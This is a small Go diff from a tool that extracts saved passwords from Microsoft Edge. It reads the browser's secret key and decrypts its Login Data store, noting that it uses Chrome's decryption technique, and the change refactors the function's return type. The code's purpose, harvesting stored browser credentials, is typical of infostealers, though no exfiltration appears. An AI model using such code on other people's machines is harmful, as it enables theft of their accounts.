@@ -11,18 +11,15 @@ var (
 
 // USES SAME DECRYPTION TECHNIQUE AS CHROME
 
-func Edge() BrowserConfig {
-	credentials := BrowserConfig{
-		Browser:     "edge",
-		Credentials: []Credential{},
-	}
+func Edge() []Credential {
+	credentials := []Credential{}
 
 	secretKey, err := getSecretKey(EDGE_PATH_LOCAL_STATE)
 	if err != nil {
 		fmt.Println(err.Error())
 		return credentials
 	}
-	err = getLoginData(EDGE_PATH_LOGIN_DATA, secretKey, &credentials)
+	err = getLoginData("Edge", EDGE_PATH_LOGIN_DATA, secretKey, &credentials)
 	if err != nil {
 		fmt.Println(err.Error())
 		return credentials
